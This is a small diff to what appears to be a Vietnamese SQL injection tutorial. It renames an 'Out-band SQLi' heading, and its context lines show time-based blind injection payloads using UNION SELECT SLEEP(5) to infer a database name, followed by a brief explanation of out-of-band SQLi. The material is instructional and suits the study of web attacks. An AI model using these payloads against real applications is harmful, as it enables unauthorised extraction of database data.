@@ -210,7 +210,7 @@ admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';
 admin123' UNION SELECT SLEEP(5),2 where database() like 'sqli_f%';--
 ```
 
-# Outband SQLi
+# Out-band SQLi
 
 Out-of-Band SQLi là kỹ thuật không phổ biến vì nó phụ thuộc vào việc bật các tính năng cụ thể trên máy chủ cơ sở dữ liệu hoặc vào logic của ứng dụng web để có thể thực hiện một lời gọi ra  mạng bên ngoài dựa trên kết quả truy vấn SQL.
 
